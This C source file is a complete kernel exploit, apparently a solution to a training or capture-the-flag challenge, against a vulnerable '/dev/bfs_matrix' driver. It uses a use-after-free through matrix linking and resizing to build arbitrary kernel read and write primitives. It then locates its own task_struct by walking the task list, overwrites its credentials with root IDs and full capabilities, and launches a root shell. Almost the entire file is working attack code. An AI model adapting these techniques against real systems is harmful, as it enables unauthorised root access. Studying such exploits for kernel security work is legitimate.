#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/bfs_matrix"

#define MAX_MATRIX_NAME 16

#define IOCTL_MATRIX_SET_NAME _IOWR('s', 1, void*)
#define IOCTL_MATRIX_GET_NAME _IOWR('s', 2, void*)
#define IOCTL_MATRIX_GET_INFO _IOWR('s', 3, struct matrix_info)
#define IOCTL_MATRIX_SET_INFO _IOWR('s', 4, struct matrix_info)
#define IOCTL_MATRIX_GET_POS  _IOWR('s', 5, struct matrix_pos)
#define IOCTL_MATRIX_SET_POS  _IOWR('s', 6, struct matrix_pos)
#define IOCTL_MATRIX_DO_LINK  _IOWR('s', 7, int)

struct matrix_info
{
  int rows;
  int cols;
};

struct matrix_pos
{
  int row;
  int col;
  uint8_t byte;
};

struct matrix
{
    int rows;                 // number of rows in the matrix
    int cols;                 // number of columns in the matrix
    uint8_t* data;            // 1-d backing data (rows x cols size)
    char name[MAX_MATRIX_NAME]; // name of the matrix
    struct matrix* link;      // linked peer
    struct task_struct* task; // owner of the object
    unsigned long lock;          // fine grained locking
};

// Undefine this if you don't want debug trazes
#define DEBUG 1

#ifdef DEBUG
#define DBG_PRINT(...)  do { fprintf(stderr, __VA_ARGS__); } while (0)
#else
#define DBG_PRINT(...)  do { } while (0)
#endif

// ----------------------------------------------------------------------------
// Exploit primitives, you need to fill them!

uint64_t kread64(uint64_t addr);
void kwrite64(uint64_t addr, uint64_t value);

// ----------------------------------------------------------------------------
// Helper functions for the exploit

uint32_t kread32(uint64_t addr)
{
  return kread64(addr);
}

void kwrite32(uint64_t addr, uint32_t value)
{
  uint32_t hi_dword = kread64(addr) >> 32;
  kwrite64(addr, ((uint64_t) hi_dword << 32) | value);
}

// Given a task structure address, patches its credentials.
void patch_creds(uint64_t task_struct)
{
#define DELTA_CREDS 0x498
  uint64_t task_creds = kread64(task_struct + DELTA_CREDS);

  struct cred
  {
    uint32_t usage;
    uint32_t uid;             /* real UID of the task */
    uint32_t gid;             /* real GID of the task */
    uint32_t suid;            /* saved UID of the task */
    uint32_t sgid;            /* saved GID of the task */
    uint32_t euid;            /* effective UID of the task */
    uint32_t egid;            /* effective GID of the task */
    uint32_t fsuid;           /* UID for VFS ops */
    uint32_t fsgid;           /* GID for VFS ops */
    uint32_t securebits;      /* SUID-less security management */
    uint64_t cap_inheritable; /* caps our children can inherit */
    uint64_t cap_permitted;	  /* caps we're permitted */
    uint64_t cap_effective;	  /* caps we can actually use */
    uint64_t cap_bset;	      /* capability bounding set */
  };

#define GLOBAL_ROOT_UID     0
#define GLOBAL_ROOT_GID     0
#define SECURE_BITS_DEFAULT 0
#define CAP_EMPTY_SET       0
#define CAP_FULL_SET        -1

  kwrite32(task_creds + offsetof(struct cred, uid),   GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, gid),   GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, suid),  GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, sgid),  GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, euid),  GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, egid),  GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, fsuid), GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, fsgid), GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, securebits), SECURE_BITS_DEFAULT);
  kwrite64(task_creds + offsetof(struct cred, cap_inheritable), CAP_EMPTY_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_permitted),   CAP_FULL_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_effective),   CAP_FULL_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_bset),        CAP_FULL_SET);

  DBG_PRINT("[+] patched credentials %lx (task=%lx)\n", task_creds, task_struct);
}

// Receives the kernel base address and returns the task structure of the
// current task.
uint64_t lookup_current_task(uint64_t kbase)
{
  char new_task_name[] = "bfs_findme";

  if (prctl(PR_SET_NAME, new_task_name, 0, 0, 0) < 0)
    errx(1, "couldn't set new task name");

#define DELTA_INIT_TASK 0xa26600
  uint64_t init_task = kbase + DELTA_INIT_TASK;

#define DELTA_COMM  0x4a0
#define DELTA_TASKS 0x230

  uint64_t current_task = init_task;

  do
  {
    char task_name[17] = {0};

    *(uint64_t*) &task_name[0] = kread64(current_task + DELTA_COMM);
    *(uint64_t*) &task_name[8] = kread64(current_task + DELTA_COMM + 8);

    printf("[*] %lx -> %s\n", current_task, task_name);

    if (! strcmp(task_name, new_task_name))
      return current_task;

    current_task = kread64(current_task + DELTA_TASKS) - DELTA_TASKS;

  } while (current_task != init_task);

  errx(1, "couldn't find current task");
}

// ----------------------------------------------------------------------------
// Interface for interacting with the driver

void matrix_do_link(int fd, int link_fd)
{
  if (ioctl(fd, IOCTL_MATRIX_DO_LINK, link_fd) < 0)
    errx(1, "couldn't link matrix\n");

  DBG_PRINT("[*] matrix linked\n");
}

uint8_t matrix_get_pos(int fd, int row, int col)
{
  struct matrix_pos pos = {0};

  pos.row = row;
  pos.col = col;

  if (ioctl(fd, IOCTL_MATRIX_GET_POS, &pos) < 0)
    errx(1, "couldn't get matrix pos");

  DBG_PRINT("[*] matrix pos: matrix[%04d][%04d]=%02x\n", row, col, pos.byte);

  return pos.byte;
}

void matrix_set_pos(int fd, int row, int col, uint8_t value)
{
  struct matrix_pos pos = {0};

  pos.row = row;
  pos.col = col;
  pos.byte = value;

  if (ioctl(fd, IOCTL_MATRIX_SET_POS, &pos) < 0)
    errx(1, "couldn't set matrix pos");

  DBG_PRINT("[*] updated matrix pos: matrix[%04d][%04d]=%02x\n", row, col, value);
}

struct matrix_info matrix_get_info(int fd)
{
  struct matrix_info info = {0};

  if (ioctl(fd, IOCTL_MATRIX_GET_INFO, &info) < 0)
    errx(1, "couldn't get matrix info");

  DBG_PRINT("[*] matrix info: rows=%d columns=%d\n", info.rows, info.cols);

  return info;
}

void matrix_set_info(int fd, int rows, int cols)
{
  struct matrix_info info = {0};

  info.rows = rows;
  info.cols = cols;

  if (ioctl(fd, IOCTL_MATRIX_SET_INFO, &info) < 0)
    errx(1, "couldn't set matrix info");

  DBG_PRINT("[*] matrix info updated to: rows=%d columns=%d\n", rows, cols);
}

char* matrix_get_name(int fd)
{
  char name[MAX_MATRIX_NAME+1] = {0};

  if (ioctl(fd, IOCTL_MATRIX_GET_NAME, name) < 0)
    errx(1, "couldn't get matrix name");

  DBG_PRINT("[*] matrix name: %s\n", name);

  return strdup(name);
}

void matrix_set_name(int fd, char* name)
{
  if (ioctl(fd, IOCTL_MATRIX_SET_NAME, name) < 0)
    errx(1, "couldn't set matrix name");

  DBG_PRINT("[*] matrix name updated\n");
}

int matrix_new()
{
  int fd = open(DEVICE_NAME, O_RDWR);
  if (fd < 0)
    errx(1, "couldn't open device");

  DBG_PRINT("[*] new matrix fd: %d\n", fd);

  return fd;
}

// ----------------------------------------------------------------------------
// Exploit begins here

int tmp_fd = -1;
int read_fd = -1;
int write_fd = -1;

void setup_addr(uint64_t addr){
    if(tmp_fd == -1 || read_fd == -1 || write_fd == -1){
        errx(1, "no fd");
    }

    for(int i = 0; i < 8; i++){//Overwrite data_ptr
        unsigned char addr_byte = addr >> (8 * i) & 0xff;
        //DBG_PRINT("WRITING byte %x\n", addr_byte);
        matrix_set_pos(tmp_fd, i, 1, addr_byte);
    }
    DBG_PRINT("Setup addr %016lx\n", addr);
}

uint64_t read_addr(int fd, int col_off){
    uint64_t res = 0;
    for(unsigned long i = 0; i < 8; i++){
        uint64_t byte_val = (uint64_t)(matrix_get_pos(fd, i, col_off)) << (i * 8);
        //DBG_PRINT("READ byte %lx\n", byte_val);
        res |= byte_val;
    }
    DBG_PRINT("READ addr %016lx\n", res);
    return res;
}

void write_addr(int fd, uint64_t val){
    for(unsigned long i = 0; i < 8; i++){
        unsigned char byte_val = (val >> (i * 8) & 0xff);
        matrix_set_pos(fd, i, 0, byte_val);
    }
    DBG_PRINT("Write value %016lx\n", val);
}

uint64_t kread64(uint64_t addr)
{
    setup_addr(addr);
    return read_addr(read_fd, 0);
}

void kwrite64(uint64_t addr, uint64_t value)
{
    setup_addr(addr);
    write_addr(write_fd, value);
}

int main(int argc, char* argv[argc+1])
{
    int m1 = matrix_new();
    int m2 = matrix_new();
    int m3 = matrix_new();

    matrix_do_link(m1, m2);

    matrix_set_pos(m2, 0, 0, 0x41);
    matrix_set_pos(m1, 0, 0, 0x42);

    matrix_get_pos(m1, 0, 0);
    matrix_get_pos(m2, 0, 0);
    matrix_get_pos(m3, 0, 0);

    matrix_do_link(m2, m3);
    matrix_set_info(m2, 8, 8); //So we have 2 matrix-sized buffers freed here
    close(m2);
    
    DBG_PRINT("SIZEOF matrix is %lu", sizeof(struct matrix));
    matrix_set_info(m1, 8, 8);//This will point m1 data ptr to old m2 matrix - it has ptr to old m2 data_ptr
   
    int m4 = matrix_new(); //Here m4 matrix will occupy same address as m2 data_ptr
    int m5 = matrix_new(); //This one is for linking to m5 for arbitrary write

    matrix_do_link(m4, m5);

    tmp_fd = m1;
    read_fd = m4;
    write_fd = m5;
    
    uint64_t m4_addr = read_addr(m1, 4);
    uint64_t curr_task = read_addr(m1, 5);
    //At this point - if we write to m1, we overwrite m4 matrix
    //If we read from m1 - we read old m2 values

    

    //Arb read test
    kread64(m4_addr);
    //Arb write test
    kwrite64(m4_addr, 0x0000005000000050);
    kread64(m4_addr);

    patch_creds(curr_task);

    system("/bin/sh");
    return EXIT_SUCCESS;
}

